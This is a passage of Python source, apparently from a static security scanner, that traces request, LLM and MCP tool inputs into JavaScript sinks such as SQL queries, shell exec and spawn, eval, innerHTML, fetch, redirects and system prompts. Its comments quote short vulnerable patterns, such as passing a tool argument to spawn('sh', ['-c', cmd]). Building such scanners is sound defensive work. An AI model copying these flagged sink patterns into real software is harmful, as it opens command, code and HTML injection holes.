        return bool(re.search(rx, self.mask))

    def bind_params(self, names, origin, key=None, groups=None):
        seeded = set()
        if origin == PARAM and key in self.seeds:
            for i in self.seeds[key]:
                if i == "*":
                    seeded = set(names)
                elif groups and i < len(groups):
                    seeded.update(groups[i])
        for n in names:
            self.strs.pop(n, None)
            self.vals.pop(n, None)
            if origin == TOOL and n in self.typed:
                self.env.pop(n, None)  # z.number(), z.enum([...]): o SDK valida antes de chamar
            else:
                self.env[n] = {TOOL if n in seeded else origin}

    def call_events(self):
        """Chamadas aos helpers do próprio arquivo e às funções importadas do projeto, para seguir argumento de
        ferramenta até elas."""
        funcs = {k[2:] for k in self.fn_groups if k.startswith("f:")}
        methods = {k[2:] for k in self.fn_groups if k.startswith("m:")}
        imported = {n for n in self.ximports if n not in funcs}
        events = []
        if funcs or imported:
            for m in _JS_BARE_CALL.finditer(self.mask):
                name = m.group(1)
                prefix = "f:" if name in funcs else "x:" if name in imported else None
                if prefix is None or _JS_FN_DECL_TAIL.search(self.mask, max(0, m.start() - 12), m.start()):
                    continue  # não é helper, ou é a própria declaração
                events.append((m.start(), 1, "sink", (self.call_helper, (prefix + name, m))))
        if methods and "this" in self.mask:
            for m in _JS_THIS_CALL.finditer(self.mask):
                if m.group(1) in methods:
                    events.append((m.start(), 1, "sink", (self.call_helper, ("m:" + m.group(1), m))))
        return events

    def call_helper(self, data):
        key, m = data
        cl = self.close(m.end() - 1, 2000)
        if cl > 0 and re.match(r"\s*(?::\s*[^{;=()]{1,120})?\{", self.mask[cl + 1:cl + 130]) and \
                not re.search(r"[=(,:?&|!]\s*(?:async\s*)?$|return\s*$|await\s*$", self.mask[max(0, m.start() - 20):m.start()]):
            return  # método declarado (nome(args) {), não chamada
        tainted = {n for n, v in self.env.items() if TOOL in v}
        if not tainted and not self.mcp and self.tool_rx is None:
            return
        this = any(n.startswith("this.") for n in tainted)
        for i, (a, b) in enumerate(self.args(m.end())):
            text = self.mask[a:b]
            if _JS_FN_LITERAL.match(text):
                continue  # callback passado ao helper: é uma função, não o valor
            words = set(_IDENT.findall(text))
            if not (words & tainted or this and "this" in words or self.mcp and "params" in words or
                    self.tool_rx is not None and words & {"arguments", "input", "args"}):
                continue  # nenhum nome com argumento de ferramenta no trecho: não precisa de origins
            if TOOL in self.origins(a, b) and not self.fixed_argv(a, b):
                self.seeds.setdefault(key, set()).add("*" if self.mask[a:a + 3] == "..." else i)

    def fixed_argv(self, a, b):
        """['docker', 'build', caminho]: lista de argumentos com o programa escrito no código (como _Py.fixed_argv)."""
        a, b = self.trim(a, b)
        if self.code[a:a + 1] != "[":
            return False
        items = self.args(a + 1)
        return bool(items) and self.code[items[0][0]:items[0][0] + 1] in ("'", '"', "`") and \
            all(k == "lit" for k, _ in self.pieces(*items[0]))

    def local_rules(self):
        """Regras que olham só o trecho: TLS, aleatório, hash de senha, rota de IA aberta."""
        code, mask = self.code, self.mask
        if "rejectUnauthorized" in mask or "strictSSL" in mask or "NODE_TLS_REJECT_UNAUTHORIZED" in code:
            self.tls()
        if "random" in mask:
            self.weak_random()
        if any(t in code for t in ("createHash", "md5", "sha1", "sha256", "sha512", "CryptoJS")):
            self.hashing()
        self.unbounded()

    def guard_events(self):
        """if (!ALLOWED.includes(x)) return, if (!/^[a-z_]+$/.test(x)) throw: o nome conferido, na posição do if."""
        return [(m.start(), 0, "guard", (m.group(3), m.group(1) and m.span(1), m.group(2) and m.span(2)))
                for m in _JS_GUARD_IF.finditer(self.mask)]

    def guard(self, name, allow, rx):
        """Depois do if, o nome é um dos permitidos. A lista não pode vir de quem chama; a regex (literal ou const
        declarada antes) só vale ancorada nas duas pontas e sem a flag m."""
        if allow and self.origins(*allow) & (REQ_ANY | MODEL | {TOOL}):
            return
        if rx:
            word = self.code[rx[0]:rx[1]].strip()
            span = rx if word[:1] == "/" else self.vals.get(word)
            lit = self.code[span[0]:span[1]].strip() if span else ""
            j = lit.rfind("/")
            if not (lit[:1] == "/" and j > 0 and "m" not in lit[j + 1:] and _anchored(lit[1:j])):
                return
        for d in (self.env, self.strs, self.vals):
            d.pop(name, None)

    def flow_events(self):
        """Declarações, atribuições e parâmetros de função, na ordem do arquivo."""
        mask = self.mask
        events = []
        for m in _JS_DECL.finditer(mask):
            if m.start() and (mask[m.start() - 1] in _WORDCH or mask[m.start() - 1] == "."):
                continue
            events.append((m.start(), 0, "decl", (_pattern_names(m.group(1)), m.end(), "=")))
        i = mask.find("=")
        while i >= 0:
            if mask[i + 1:i + 2] not in ("=", ">") and mask[i - 1:i] not in ("=", "!", "<", ">", "-", "*", "/", "%", "&", "|", "^", "?"):
                self.assignment(i, events)
            i = mask.find("=", i + 1)
        for m in _JS_FUNC.finditer(mask):
            if m.start() and (mask[m.start() - 1] in _WORDCH or mask[m.start() - 1] == "."):
                continue
            self.params_event("function", m.start(), m.end() - 1, None, events, m.group(1) and "f:" + m.group(1))
        for m in _JS_METHOD.finditer("\n" + mask):
            if m.group(1) not in _JS_NOT_METHOD:
                self.params_event("method", m.start(1) - 1, m.start(2) - 1, None, events, "m:" + m.group(1))
        i = mask.find("=>")
        while i >= 0:
            self.arrow(i, events)
            i = mask.find("=>", i + 2)
        return events

    def assignment(self, i, events):
        """x = ... ou this.x += ... no começo de uma instrução (o "=" está em i)."""
        mask = self.mask
        op = "+=" if mask[i - 1] == "+" else "="
        j = i - 1 - (op == "+=")
        while j >= 0 and mask[j] in " \t":
            j -= 1
        k = j
        while k >= 0 and mask[k] in _WORDCH:
            k -= 1
        name = mask[k + 1:j + 1]
        if not name or name[0].isdigit():
            return
        if mask[max(0, k - 4):k + 1] == "this.":
            k -= 5
            name = "this." + name
        q = k
        while q >= 0 and mask[q] in " \t":
            q -= 1
        if q > 0 and mask[q - 1:q + 1] == "$:":  # declaração reativa do Svelte ($: x = ...)
            q -= 2
            while q >= 0 and mask[q] in " \t":
                q -= 1
        if q < 0 or mask[q] in "\n;{}":
            events.append((k + 1, 0, "decl", ([name], i + 1, op)))

    def arrow(self, i, events):
        mask = self.mask
        j = i - 1
        while j >= 0 and mask[j] in " \t\r\n":
            j -= 1
        if j < 0:
            return
        if mask[j] != ")":
            t = _JS_ARROW_TYPE.search(mask, max(0, j - 100), j + 1)
            if t:
                j = t.start()
        if mask[j] == ")":
            op = self.open_before(j)
            if op >= 0:
                self.params_event("arrow", op, op, None, events)
        elif mask[j] in _WORDCH:
            k = j
            while k >= 0 and mask[k] in _WORDCH:
                k -= 1
            if k >= 0 and mask[k] == ".":
                return
            name = mask[k + 1:j + 1]
            if _IDENT.fullmatch(name) and name not in _JS_NOT_METHOD:
                self.params_event("arrow", k + 1, None, name, events)

    def params_event(self, kind, at, op, name, events, key=None):
        if name:
            groups, start = [[name]], at
        else:
            cl = self.close(op, 2000)
            if cl < 0:
                return
            if kind == "method" and not re.match(r"\s*(?::\s*[^{;=]{1,120})?\{", self.mask[cl + 1:cl + 130]):
                return
            groups, start = _param_groups(self.mask[op + 1:cl]), op
        names = [n for g in groups for n in g]
        if not names:
            return
        before = self.mask[max(0, at - 120):at]
        origin = PARAM
        if self.has_tool and self.tool_handler(kind, at, start, op, before):
            origin = TOOL
        elif op is not None and kind != "method" and self.route_head(at, op):
            # GET(req, { params }): o segundo argumento é o pedaço da URL.
            names = names[1:]
            origin = REQ
        if self.has_tool:
            key = key or _fn_key(before)
            if key:
                self.fn_groups.setdefault(key, groups)
                if origin == TOOL:
                    self.fn_tool.add(key)
            if key or origin == TOOL:
                bisect.insort(self.fn_starts, start)
        events.append((start, 0, "params", (names, origin, key, groups)))

    def guard_start(self, pos, back):
        """Onde procurar a checagem antes do sink: até back caracteres, sem passar do começo da função (a checagem de
        outra ferramenta do mesmo arquivo não protege esta)."""
        lo = max(0, pos - back)
        i = bisect.bisect_right(self.fn_starts, pos) - 1
        return max(lo, self.fn_starts[i]) if i >= 0 else lo

    def depth_at(self, pos):
        """Quantos (, [ e { estão abertos antes de pos."""
        if self._depth is None:
            ps, ds, d = [], [], 0
            opens = collections.defaultdict(list)  # profundidade depois de abrir -> posições, em ordem
            for m in _BRACKETS.finditer(self.mask):
                if m.group() in "([{":
                    d += 1
                    opens[d].append(m.start())
                else:
                    d -= 1
                ps.append(m.start())
                ds.append(d)
            self.spend(len(self.mask) // 4)
            self._depth, self._opens = (ps, ds), opens
        ps, ds = self._depth
        i = bisect.bisect_left(ps, pos) - 1
        return ds[i] if i >= 0 else 0

    def tool_handler(self, kind, at, start, op, before):
        """A função é o handler da ferramenta: argumento direto de server.tool(...), registerTool(...),
        setRequestHandler(CallToolRequestSchema, ...), ou o valor de execute/handler/func no objeto de tool({...}).
        Callbacks dentro do handler (.map(x => ...), exec(cmd, (err, out) => ...)) não recebem o argumento."""
        for a, b in self.tool_spans:
            if a <= start <= b:
                d = self.depth_at(start) - self.depth_at(a)
                if d == 0:
                    return True
                if d == 1 and (_JS_EXECUTE_KEY.search(before) or kind == "method" and op is not None and
                               re.fullmatch(r"\s*(?:execute|func|handler|run|invoke|call)\s*", self.mask[at:op])):
                    return True
        if _JS_EXECUTE_KEY.search(before):
            # { name, description, inputSchema, handler: async (args) => ... } fora de uma chamada conhecida.
            depth, i = 0, at
            lim = max(0, at - 3000)
            while i > lim:
                i -= 1
                c = self.mask[i]
                if c in ")]}":
                    depth += 1
                elif c in "([{":
                    if depth == 0:
                        return c == "{" and bool(_JS_TOOL_KEYS.search(self.mask, i, at))
                    depth -= 1
        return False

    def route_head(self, at, op):
        r = _JS_ROUTE_FN.search(self.mask, max(0, at - 80), op + 1)
        return bool(r) and r.end() == op + 1

    def declare(self, names, start, op):
        end = self.expr_end(start)
        o = self.origins(start, end)
        t = _JS_ALLOW_TERNARY.match(self.mask, start, end)
        if t and re.sub(r"\s", "", t.group(1)) == re.sub(r"\s", "", t.group(2)):
            o = self.origins(t.end(), end)  # ALLOWED.includes(x) ? x : 'name': só o valor padrão pode vir de fora
        value = self.mask[start:end].strip()
        builds = value[:1] in "'\"`" or ("+" in value and re.search(r"[`'\"]", self.mask[start:end]))
        m = re.match(r"(?:util\s*\.\s*)?promisify\s*\(\s*(?:([\w$]+)\s*\.\s*)?(exec|execFile)\s*\)", value)
        for n in names:
            if m and (m.group(1) in self.cp_mods or m.group(2) in self.cp_funcs):
                self.cp_funcs[n] = m.group(2)
            if op == "+=":
                o2 = self.env.get(n, set()) | o
                if n in self.strs:
                    if len(self.strs[n]) < _STR_PARTS:
                        self.strs[n] = self.strs[n] + [(start, end)]
                    else:
                        del self.strs[n]
            else:
                o2 = o
                if builds and len(names) == 1:
                    self.strs[n] = [(start, end)]
                else:
                    self.strs.pop(n, None)
                if len(names) == 1 and op == "=" and not builds:
                    self.vals[n] = (start, end)
                else:
                    self.vals.pop(n, None)
            if o2:
                self.env[n] = o2
            else:
                self.env.pop(n, None)

    def verdict_string(self, a, b, need_sql=False, raw=False):
        """(severidade, origem) de uma string montada com valores no meio, ou None."""
        parts = self.pieces(a, b)
        exprs = [(i, p) for i, (k, p) in enumerate(parts) if k == "expr"]
        if not exprs or all(k == "expr" for k, _ in parts) and len(parts) == 1:
            return None
        lit = "".join(p if k == "lit" else "x1" for k, p in parts)
        if need_sql and not raw and not looks_sql(lit):
            return None
        ddl = bool(_SQL_DDL.match(lit))
        best = None
        for i, (x, y) in exprs:
            if self.static(x, y, value=True):
                continue
            o = self.origins(x, y)
            value_pos = bool(_VALUE_POS.search(_lit_before(parts, i)))
            sev = "high"
            if self.static(x, y):
                # Como em _Py.sql_verdict: ORDER BY ${order} vindo de fora é médio; WHERE ${where} continua alto.
                if not o & (REQ_ANY | MODEL):
                    continue
                if not value_pos and not _SQL_FRAGMENT.search(self.code[x:y].strip()):
                    sev = "medium"
            if LLM in o:
                v = (sev, LLM)
            elif TOOL in o:
                v = (sev, TOOL)
            elif REQ in o:
                v = (sev, REQ)
            elif PARAM in o and not ddl and value_pos:
                v = ("medium", PARAM)
            else:
                continue
            if sev == "high" and v[1] in MODEL:
                return v
            best = _sql_best(best, v)
        return best

    # ------------------------------------------------------------------ sinks

    def lead_ok(self, p, dot_ok=True):
        """O nome em p começa ali (não é o fim de outro nome nem, se dot_ok for falso, um método de outro objeto)."""
        if not p:
            return True
        c = self.mask[p - 1]
        return c not in _WORDCH and (dot_ok or c != ".")

    def receiver(self, dot):
        """"a.b.c" em a.b.c.metodo( ("" quando antes do ponto não há um nome, como em f().metodo()."""
        mask, j, parts = self.mask, dot - 1, []
        while True:
            if j >= 0 and mask[j] == "?":
                j -= 1
            while j >= 0 and mask[j] in " \t\r\n":
                j -= 1
            k = j
            while k >= 0 and mask[k] in _WORDCH:
                k -= 1
            name = mask[k + 1:j + 1]
            if not name or name[0].isdigit():
                break
            parts.append(name)
            j = k
            while j >= 0 and mask[j] in " \t\r\n":
                j -= 1
            if j < 0 or mask[j] != ".":
                break
            j -= 1
        return ".".join(reversed(parts))

    def sql(self, m):
        method = m.group(1)
        recv = self.receiver(m.start())
        if not recv and method not in _JS_RAW:
            return  # f().query(...) sem objeto conhecido; knex("t").whereRaw(...) continua valendo
        args = self.args(m.end())
        if not args:
            return
        a, b = args[0]
        t = self.code[a:b]
        if re.match(r"[\w$.]+\s*`", t) or t[:1] in "{[":
            return  # sql`...`, Prisma.sql`...`: o driver passa os valores como parâmetros
        raw = method in _JS_RAW or recv.endswith("sql") and method == "raw"
        v = self.verdict_string(a, b, need_sql=True, raw=raw) if self.sql_lits or raw else None
        if v is None and (raw or (method in ("query", "execute", "raw", "unsafe", "exec") and _JS_DB_RECEIVER.search(recv))):
            parts = self.pieces(a, b)
            if len(parts) != 1 or parts[0][0] != "expr":
                return
            o = self.origins(a, b)
            v = ("high", LLM) if LLM in o else ("high", REQ) if REQ in o else None
        if v:
            sev, origin = v
            if origin == LLM:
                self.out.add("APP009", sev, self.line(m.start(1)), _llm_params("sql"))
            elif origin == TOOL:
                self.out.tool("sql", True, self.line(m.start(1)), sev)
            else:
                self.out.add("COD001", sev, self.line(m.start(1)), _src(origin))

    def command(self, m):
        recv, fn = m.group(1), m.group(2)
        if recv:
            if recv in self.cp_mods:
                pass
            elif "shell:" + recv in self.cp_mods and fn == "exec":
                fn = "execShell"
            else:
                return
        elif fn not in self.cp_funcs and fn not in self.cp_funcs.values():
            return
        else:
            fn = self.cp_funcs.get(fn, fn)
        self.run_command(m, fn)

    def command_inline(self, m):
        self.run_command(m, m.group(1))

    def run_command(self, m, fn):
        args = self.args(m.end())
        if not args:
            return
        a, b = args[0]
        rest = self.code[args[1][0]:args[-1][1]] if len(args) > 1 else ""
        shell = fn in ("exec", "execSync", "execShell", "execaCommand", "execaCommandSync") or \
            bool(re.search(r"""\bshell\s*:\s*(?:true\b|['"`])""", rest))
        argv = self.args(args[1][0] + 1) if len(args) > 1 and self.code[args[1][0]] == "[" else []
        spans = [args[0]]
        interp = self.interp_c(args[0], argv[0]) if not shell and fn in _CP_ARGV and len(argv) >= 2 else None
        if interp:
            # execFile("python3", ["-c", texto]), spawn(process.execPath, ["-e", texto]): o texto é código.
            parts = self.pieces(*argv[1])
            if parts and not all(k == "lit" for k, _ in parts):
                o = set()
                for k, p in parts:
                    if k == "expr":
                        o |= self.origins(*p)
                built = any(k == "lit" for k, _ in parts)
                self.report_exec(o, built, "code", m, "COD003", dict(_src(REQ), sink=interp))
            return
        if not shell and fn in _CP_ARGV and len(argv) >= 2 and self.shell_c(args[0], argv[0]):
            # spawn("sh", ["-c", cmd]), execFile("bash", ["-lc", cmd]): o terceiro item vai inteiro para o shell.
            shell, spans = True, [argv[1]]
        elif shell and fn in _CP_ARGV and argv:
            # spawn(cmd, [a, b], { shell: true }): o Node junta tudo num texto só e passa ao shell.
            spans = [args[0]] + argv
        parts = [p for x, y in spans for p in self.pieces(x, y)]
        if parts and all(k == "lit" for k, _ in parts):
            if shell or not args[1:]:
                return
        built = any(k == "lit" for k, _ in parts) and any(k == "expr" for k, _ in parts)
        if shell:
            o = set()
            for k, p in parts:
                if k == "expr":
                    o |= self.origins(*p)
        else:
            first = self.pieces(a, b)
            o = self.origins(a, b) if not (first and first[0][0] == "lit") else set()
            built = False
        self.report_exec(o, built, "shell", m, "COD002", _src(REQ))

    def interp_c(self, prog, flag):
        """"python3 -c" para execFile("python3", ["-c", ...]) ou spawn(process.execPath, ["-e", ...]); senão None."""
        p = self.code[prog[0]:prog[1]].strip()
        f = self.code[flag[0]:flag[1]].strip()
        if len(f) < 3 or f[0] not in "'\"`" or f[-1] != f[0]:
            return None
        if len(p) >= 3 and p[0] in "'\"`" and p[-1] == p[0]:
            p = p[1:-1]
        elif re.sub(r"\s", "", p) != "process.execPath":
            return None
        else:
            p = "process.execPath"
        return p.replace("\\", "/").rsplit("/", 1)[-1] + " " + f[1:-1] if _interp_flag(p, f[1:-1]) else None

    def shell_c(self, prog, flag):
        p = self.code[prog[0]:prog[1]].strip()
        f = self.code[flag[0]:flag[1]].strip()
        if len(p) < 3 or p[0] not in "'\"`" or p[-1] != p[0] or len(f) < 3 or f[0] not in "'\"`" or f[-1] != f[0]:
            return False
        return p[1:-1].replace("\\", "/").rsplit("/", 1)[-1].lower() in _SHELLS and f[1:-1] in _SHELL_FLAGS

    def report_exec(self, o, built, kind, m, rule, params):
        ln = self.line(m.start())
        if LLM in o:
            self.out.add("APP009", "critical", ln, _llm_params(kind))
        elif TOOL in o:
            self.out.tool(kind, built, ln)
        elif REQ in o:
            self.out.add(rule, "critical", ln, params)

    def code_exec(self, m):
        g = m.group(0)
        if not self.lead_ok(m.start(), g.startswith(("new", "vm"))):
            return
        args = self.args(m.end())
        if not args:
            return
        a, b = args[-1] if "Function" in g else args[0]
        parts = self.pieces(a, b)
        if not parts or all(k == "lit" for k, _ in parts):
            return
        if ("setTimeout" in g or "setInterval" in g) and not any(k == "lit" for k, _ in parts):
            return  # setTimeout(fn, ...) recebe função, não texto
        built = any(k == "lit" for k, _ in parts)
        o = set()
        for k, p in parts:
            if k == "expr":
                o |= self.origins(*p)
        sink = "eval()" if "eval" in g else "new Function()" if "Function" in g else "vm" if "vm" in g else g.split("(")[0].strip() + "()"
        self.report_exec(o, built, "code", m, "COD003", dict(_src(REQ), sink=sink))

    def html_value(self, a, b, sink, pos):
        a, b = self.trim(a, b)
        if a >= b:
            return
        s = self.code[a:b]
        parts = self.pieces(a, b)
        # Só no código: class="icon" e style="..." no HTML fixo não limpam o valor que entra.
        if not parts or all(k == "lit" for k, _ in parts) or _JS_SANITIZE.search(self.mask[a:b]):
            return
        o = set()
        for k, p in parts:
            if k == "expr":
                o |= self.origins(*p)
        built = any(k == "lit" and "<" in p for k, p in parts) and any(k == "expr" and not self.static(*p) for k, p in parts)
        ln = self.line(pos)
        if LLM in o or (self.chat_hooks and re.search(r"\.(?:content|text)\b|\bcompletion\b|\.parts\b", s)):
            self.out.add("APP009", "medium", ln, _llm_params("html"))
        elif TOOL in o:
            self.out.tool("html", True, ln)
        elif REQ in o:
            self.out.add("COD005", "medium", ln, {"sink": sink})
        elif built and sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write") and \
                not _JS_SANITIZE.search(s):
            self.out.add("COD005", "low", ln, {"sink": sink})  # <svg ...>${caminho}</svg>: ícone montado no código

    def html(self, m):
        g = m.group(0)
        if g.startswith("document") and not self.lead_ok(m.start()):
            return
        if "dangerously" in g:
            end = self.expr_end(m.end())
            self.html_value(m.end(), end, "dangerouslySetInnerHTML", m.start())
        elif "insertAdjacentHTML" in g:
            args = self.args(m.end())
            if len(args) > 1:
                self.html_value(*args[1], "insertAdjacentHTML", m.start())
        elif "write" in g:
            args = self.args(m.end())
            if args:
                self.html_value(*args[0], "document.write", m.start())
        else:
            self.html_value(m.end(), self.expr_end(m.end()), "outerHTML" if "outer" in g else "innerHTML", m.start())

    def res_html(self, m):
        """res.send(`<h1>${req.query.name}</h1>`): a página que o servidor devolve reflete o que veio na requisição."""
        args = self.args(m.end())
        if not args:
            return
        parts = self.pieces(*args[0])
        if not re.search(r"<[a-zA-Z!/]", "".join(p for k, p in parts if k == "lit")):
            return
        for k, p in parts:
            if k == "expr" and not self.static(*p) and not _JS_HTML_SAFE.search(self.code[p[0]:p[1]]) and REQ in self.origins(*p):
                sink = "c.html" if m.group(2) else "res." + m.group(1)
                self.out.add("COD005", "medium", self.line(m.start()), {"sink": sink})
                return

    def template_html(self):
        if not self.rel.endswith((".vue", ".svelte", ".astro")):
            return
        sink = {".vue": "v-html", ".svelte": "{@html}", ".astro": "set:html"}[self.rel[self.rel.rfind("."):]]
        for m in _TPL_HTML.finditer(self.text):
            expr = next(g for g in m.groups() if g is not None)
            if _JS_SANITIZE.search(expr) or not expr.strip() or re.fullmatch(r"\s*(['\"`]).*\1\s*", expr):
                continue
            o = set()
            for w in _JS_WORD.finditer(expr):
                o |= self.env.get(w.group(1), set())
            if _JS_REQ.search(expr):
                o.add(REQ)
            if _JS_LLM.search(expr):
                o.add(LLM)
            ln = self.line(m.start())
            if o & MODEL or (self.chat_hooks and re.search(r"\.(?:content|text)\b|\bcompletion\b", expr)):
                self.out.add("APP009", "medium", ln, _llm_params("html"))
            elif REQ in o:
                self.out.add("COD005", "medium", ln, {"sink": sink})

    def files(self, m):
        if not self.lead_ok(m.start(), m.re is _JS_FS):
            return
        args = self.args(m.end())
        if not args:
            return
        a, b = args[0]
        s = self.code[a:b]
        if re.search(r"\bbasename\s*\(", s) or (len(args) > 1 and re.search(r"\broot\s*:", self.code[args[1][0]:args[-1][1]])):
            return
        if _JS_GUARD_PATH.search(self.code, self.guard_start(m.start(), 800), m.start()):
            return
        o = self.origins(a, b)
        if REQ in o:
            self.out.add("COD007", "high", self.line(m.start()), {"sink": re.sub(r"\s", "", m.group(0)).rstrip("(") + "()"})
        elif TOOL in o:
            built, fixed = self.path_shape(a, b)
            if not fixed:
                self.out.tool("path", built, self.line(m.start()))

    def path_shape(self, a, b):
        """(montado, nome_fixo), como _Py.path_shape. Montado: path.join(BASE, nome), `${BASE}/${nome}`, BASE + nome: a
        pasta é do código, e ../ sai dela. Nome fixo: path.join(pasta, 'config.json'), o modelo só escolhe a pasta."""
        a, b = self.trim(a, b)
        word = self.code[a:b]
        if word in self.strs and len(self.strs[word]) == 1:
            a, b = self.trim(*self.strs[word][0])
        elif word in self.vals:
            a, b = self.trim(*self.vals[word])
        j = re.match(r"(?:path\s*\.\s*)?(?:join|resolve)\s*\(", self.mask[a:b])
        if j:
            inner = self.args(a + j.end())
            first = inner[0] if len(inner) > 1 else None
            tail = inner[-1:] if len(inner) > 1 else None
            built = first is not None and TOOL not in self.origins(*first)
            fixed = tail is not None and TOOL not in self.origins(*tail[0])
            return built, fixed
        parts = [p for p in self.pieces(a, b) if not (p[0] == "lit" and not p[1])]
        cut = [i for i, p in enumerate(parts) if p[0] == "lit" and re.search(r"[/\\]", p[1])]
        fixed = bool(cut) and cut[-1] > 0 and not any(TOOL in self.origins(*p[1]) for p in parts[cut[-1] + 1:]
                                                       if p[0] == "expr")
        if len(parts) < 2:
            return False, fixed
        if parts[0][0] == "lit":
            return True, fixed
        return TOOL not in self.origins(*parts[0][1]), fixed

    def lead_origins(self, a, b, host=False, slash=False):
        """Origens do começo do endereço (esquema e host), não de um pedaço do caminho. host e slash: como em
        _Py.lead_origins."""
        span = self.lead_span(a, b, 0, host, slash)
        return set() if span is None else self.origins(*span)

    def lead_span(self, a, b, depth, host, slash):
        """Onde está o valor que decide o começo do endereço, ou None quando o começo é fixo."""
        a, b = self.trim(a, b)
        s = self.mask[a:b]
        if depth < 3 and s in self.vals and s not in self.strs:
            # const url = new URL(`${apiUrl}${caminho}`); fetch(url): o começo é o do valor declarado.
            # const full = BASE + caminho; fetch(full): idem.
            x, y = self.trim(*self.vals[s])
            if re.match(r"new\s+URL\s*\(", self.mask[x:y]) and self.close(self.mask.index("(", x)) == y - 1 or \
                    len(self.split_plus(x, y)) > 1:
                return self.lead_span(x, y, depth + 1, host, slash)
        w = re.match(r"(?:new\s+URL|decodeURIComponent|decodeURI|String|encodeURI)\s*\(", s)
        if w and self.close(a + w.end() - 1) == b - 1:
            inner = self.args(a + w.end())
            if not inner:
                return None
            a, b = inner[0]
        parts = self.pieces(a, b)
        parts = [p for p in parts if not (p[0] == "lit" and not p[1])]
        if host and len(parts) > 1 and parts[0][0] == "lit" and _IN_HOST.match(parts[0][1]):
            parts = parts[1:]  # `https://${host}/x`
        if slash and len(parts) > 1 and parts[0][0] == "lit" and _ONLY_SLASHES.match(parts[0][1]):
            parts = parts[1:]  # `/${next}`
        if not parts or parts[0][0] != "expr":
            return None
        x, y = parts[0][1]
        first = _first_option(self.mask[x:y])
        return (x, x + len(first)) if first else None

    def host_header(self, a, b, depth=0):
        """Como _Py.host_header: req.headers.host, request.headers.get('x-forwarded-host') ?? ..., c.req.header('host')."""
        a, b = self.trim(a, b)
        s = self.mask[a:b]
        if depth < 3 and s in self.vals and s not in self.strs:
            x, y = self.trim(*self.vals[s])
            first = _first_option(self.mask[x:y])
            return bool(first) and self.host_header(x, x + len(first), depth + 1)
        m = _JS_HOST_HEADER.fullmatch(self.code[a:b].strip())
        return bool(m) and (m.group(2) or m.group(4) or m.group(6) or "host").lower() in _HOST_HEADERS

    def start_controlled(self, a, b):
        """Como _Py.start_controlled: o host depois de um "https://" fixo conta, menos o cabeçalho Host."""
        if REQ in self.lead_origins(a, b, slash=True):
            return True
        span = self.lead_span(a, b, 0, True, True)
        return span is not None and REQ in self.origins(*span) and not self.host_header(*span)

    def fetch(self, m):
        if not self.lead_ok(m.start(), not _JS_BARE_FETCH.match(m.group(0))):
            return
        args = self.args(m.end())
        if not args or self.code[args[0][0]] in "{[":
            return
        if _JS_GUARD_URL.search(self.mask, self.guard_start(m.start(), 800), m.start()):
            return
        span = self.lead_span(*args[0], 0, True, False)
        o = set() if span is None else self.origins(*span)
        if REQ in o and self.server:
            sev = "medium" if self.host_header(*span) else "high"  # como em _Py.urls
            self.out.add("COD008", sev, self.line(m.start()), {"sink": re.sub(r"\s", "", m.group(0)).rstrip("(") + "()"})
        elif TOOL in o and not self.use_client:
            self.out.tool("url", False, self.line(m.start()))

    def redirect(self, m):
        g = m.group(0)
        bare = g.startswith(("redirect", "permanentRedirect", "window")) or g.startswith("location") and g.endswith("=")
        if not self.lead_ok(m.start(), not bare):
            return
        if g.rstrip().endswith("="):
            span = (m.end(), self.expr_end(m.end()))
        else:
            args = self.args(m.end())
            if not args:
                return
            span = args[0]
            if re.fullmatch(r"\d{3}", self.code[span[0]:span[1]].strip()) and len(args) > 1:
                span = args[1]
        if _JS_GUARD_REDIRECT.search(self.code, max(0, m.start() - 600), m.start()):
            return
        if self.start_controlled(*span):
            sink = re.sub(r"\s", "", g).rstrip("(=")
            self.out.add("COD009", "medium", self.line(m.start()), {"sink": sink + ("()" if "(" in g else "")})

    def system_value(self, a, b, pos):
        """Como _Py.system_text: o valor da requisição no meio de instruções escritas no código, não o prompt inteiro."""
        a, b = self.trim(a, b)
        if a >= b:
            return
        if re.search(r"\.\s*(?:replace|replaceAll|format|join|concat)\s*\(", self.mask[a:b]):
            hit = REQ in self.origins(a, b)
        else:
            parts = [p for p in self.pieces(a, b) if not (p[0] == "lit" and not p[1].strip())]
            tainted = [p for p in parts if p[0] == "expr" and REQ in self.origins(*p[1])]
            hit = bool(tainted) and len(tainted) < len(parts)
        if hit:
            self.out.add("APP010", "medium", self.line(pos))

    def system_key(self, m):
        if not self.llm_file() or not self.lead_ok(m.start(), False):
            return
        j = m.start() - 1
        while j >= 0 and self.mask[j] in " \t\r\n":
            j -= 1
        if j >= 0 and self.mask[j] not in "{,":
            return  # const systemPrompt: string = ..., não uma chave de objeto
        self.system_value(m.end(), self.expr_end(m.end()), m.start())

    def system_msg(self, m):
        if not self.llm_file() and "SystemMessage" not in m.group(0) or m.group(0)[0] != "[" and not self.lead_ok(m.start()):
            return
        if m.group(0).startswith("["):
            self.system_value(m.end(), self.expr_end(m.end()), m.start())
        else:
            args = self.args(m.end())
            if args:
                self.system_value(*args[0], m.start())

    def system_role(self, m):
        # { role: "system", content: ... }: acha o objeto em volta e o valor de content.
        depth, i = 0, m.start()
        while i > max(0, m.start() - 400):
            i -= 1
            c = self.mask[i]
            if c in ")]}":
                depth += 1
            elif c in "([{":
                if depth == 0:
                    break
                depth -= 1
        if self.mask[i] != "{":
            return
        end = self.close(i, 4000)
        if end < 0:
            return
        c = re.search(r"(?<![\w$.])content\s*:\s*", self.mask[i:end])
        if c:
            start = i + c.end()
            self.system_value(start, self.expr_end(start), m.start())

    def tls(self):
        for m in _JS_TLS.finditer(self.mask):
            self.out.add("COD006", "medium", self.line(m.start()), {"what": " ".join(m.group(0).split())})
        for m in _NODE_TLS.finditer(self.code):
            self.out.add("COD006", "medium", self.line(m.start()), {"what": "NODE_TLS_REJECT_UNAUTHORIZED=0"})

    def weak_random(self):
        decls = starts = heads = ends = None
        for m in _JS_RANDOM.finditer(self.mask):
            start = max(self.mask.rfind("\n", 0, m.start()) + 1, m.start() - 300)
            head = self.mask[start:m.start()]
            name = None
            d = _JS_RANDOM_NAME.search(head)
            if d:
                name = d.group(1)
            elif re.match(r"\s*return\b", head):
                # A última função declarada até 1500 caracteres antes do return.
                if heads is None:
                    heads = [(f.start(), f.end(), f.group(1) or f.group(2) or f.group(3)) for f in _JS_FN_HEAD.finditer(self.mask)]
                    ends = [h[1] for h in heads]
                i = bisect.bisect_right(ends, m.start()) - 1
                name = heads[i][2] if i >= 0 and heads[i][0] >= m.start() - 1500 else None
            else:
                # const token = [...Array(32)].map(() => chars[Math.floor(Math.random() * n)]).join(""), ou o valor
                # na linha de baixo: a declaração em volta decide.
                if decls is None:
